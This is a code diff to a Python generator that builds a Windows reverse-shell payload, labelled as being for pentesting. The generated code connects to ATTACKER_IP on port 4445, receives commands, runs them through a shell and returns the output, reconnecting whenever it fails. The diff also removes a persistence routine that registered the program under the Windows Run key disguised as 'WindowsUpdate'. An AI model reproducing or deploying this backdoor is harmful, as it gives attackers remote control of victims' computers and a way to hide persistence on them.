@@ -59,23 +59,13 @@ def create_payload():
     payload_code = f'''import socket
 import subprocess
 import time
-import os
-import sys
-import winreg
+
+
+
 
 #Reverse shell only for pentesting purpose! illegal use is not supported and restricted as much as possible.
 
-def add_to_startup():
-    exe_path = sys.executable
-    key = r"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run"
-    try:
-        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
-        winreg.CloseKey(reg)
-    except:
-        pass
 
-add_to_startup()
 
 ATTACKER_IP = "{ip}"
 ATTACKER_PORT = 4445
@@ -86,11 +76,13 @@ def connect():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ATTACKER_IP, ATTACKER_PORT))
             while True:
-                command = s.recv(1024).decode()
+                command = s.recv(1024).decode().strip()
                 if command.lower() == "exit":
                     break
-                output = subprocess.run(command, shell=True, capture_output=True, text=True)
-                s.send(output.stdout.encode() if output.stdout else output.stderr.encode())
+                if command:
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    output = result.stdout if result.stdout else result.stderr
+                    s.send(output.encode())
             s.close()
         except:
             time.sleep(5)
